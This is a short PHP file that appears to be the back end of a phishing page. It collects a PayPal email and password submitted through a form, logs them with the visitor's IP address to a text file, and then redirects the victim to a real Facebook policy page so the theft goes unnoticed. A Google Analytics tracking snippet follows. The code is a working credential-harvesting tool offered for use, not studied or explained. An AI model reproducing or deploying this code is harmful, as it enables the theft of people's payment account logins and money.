<?php
$file = "____________PAYPAL_________.txt";
$paypalmail = $_POST['paypalmail'];
$pwpaypal = $_POST['pwpaypal'];
$ip = $_SERVER['REMOTE_ADDR'];


$handle = fopen($file, 'a');
fwrite($handle, "xxxxPAYPALxxxx");
fwrite($handle, "\n");
fwrite($handle, "::  EMAIL     ::   ");
fwrite($handle, "$paypalmail");
fwrite($handle, "\n");
fwrite($handle, "::  PASS      ::   ");
fwrite($handle, "$pwpaypal");
fwrite($handle, "\n");
fwrite($handle, "::  IP        ::   ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "xxxxPAYPALxxxx");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://www.facebook.com/policies/pages_groups_events/\";
// -->
</script>";
?>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-33910177-1']);
  _gaq.push(['_setDomainName', 'x90x.net']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>